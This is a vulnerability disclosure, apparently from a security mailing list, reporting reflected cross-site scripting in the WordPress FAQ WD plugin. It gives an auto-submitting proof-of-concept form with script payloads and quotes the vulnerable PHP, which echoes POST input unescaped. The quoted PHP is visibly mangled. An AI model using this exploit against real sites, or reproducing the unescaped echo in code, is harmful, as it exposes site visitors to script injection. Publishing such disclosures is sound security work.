The Plugin can be found at https://wordpress.org/plugins/faq-wd/  This Bug can be triggered by unauthenticated / Authenticated user. If a user is sent a URL by social engineering and the user clicks the link the bug can be triggred.  The URL should be something like this  http://attackerssite.com/XSS_POC.html    The code for XSS_POC.html is as follows:   <html>   <body onload="document.forms['xss'].submit()" >     <form name="xss" action=" http://targetsite/wpinstallation/wp-content/plugins/faq-wd/lang/views/SLangViewPo.php" method="POST" >    <input type="hidden" name="lang_err_mess" value=" <script>alert(1);</script>" /> <input type="hidden" name="lang_success_synchron" value=" <script>alert(2);</script>" />       <input type="submit" value="Submit form" />     </form>   </body> </html>   Techinical Details:  The vulnerable page is  wp-content/plugins/faq-wd/lang/views/SLangViewPo.php  This page can be directly accessed by anyone.  The Code responsible for the vulnerability : <?php if (isset($_POST['lang_err_mess'])): ?>     <div class="error" style="display: inline-block;width: echo $_POST['lang_err_mess']; ?></p></div> <?php elseif (isset($_POST['lang_success'])): ?>     <div class="updated" style="display: inline-block;width: echo 'File was successfully updated.'; ?></p></div> <?php endif; ?> <?php if (isset($_POST['lang_success_synchron'])): ?>     <div class="updated" style="display: inline-block;width: echo $_POST['lang_success_synchron']; ?></p></div> <?php endif; ?>   Here we can see that there are two post request which are displayed in unsafe manner while rendering the page.  The vulnerable POST parameters are:     - $_POST['lang_err_mess']    - $_POST['lang_success_synchron']   --  Shravan Kumar   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
